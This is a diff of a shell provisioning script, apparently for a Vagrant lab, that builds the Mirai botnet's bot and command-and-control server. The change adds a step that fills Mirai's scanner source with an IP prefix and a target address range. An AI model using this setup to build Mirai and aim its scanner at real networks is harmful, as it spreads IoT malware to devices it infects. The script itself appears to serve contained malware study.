@@ -87,7 +87,6 @@ cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
 cp /vagrant/configs/dnsmasqhosts /etc/dnsmasqhosts
 cp /vagrant/configs/resolv.dnsmasq /etc/resolv.dnsmasq
 sed -i "s|{cnc_ip}|$cnc_ip|g;" /etc/dnsmasqhosts
-sed -i "s|{bot_ip}|$bot_ip|g;" /etc/dnsmasqhosts
 dnsmasq
 
 echo ">>> Building mirai bot and cnc..."
@@ -95,8 +94,12 @@ echo ">>> Building mirai bot and cnc..."
 DNS=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
 cp /vagrant/mirai/bot/resolv.cpp /vagrant/mirai/bot/resolv.c
 cp /vagrant/mirai/bot/util.cpp /vagrant/mirai/bot/util.c
+cp /vagrant/mirai/bot/scanner.cpp /vagrant/mirai/bot/scanner.c
 sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/resolv.c
 sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/util.c
+sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/bot/scanner.c
+sed -i "s|{tgt_bgn}|$tgt_bgn|g;" /vagrant/mirai/bot/scanner.c
+sed -i "s|{tgt_end}|$tgt_end|g;" /vagrant/mirai/bot/scanner.c
 
 # process {NI}
 cp /vagrant/mirai/bot/const.hpp /vagrant/mirai/bot/const.h
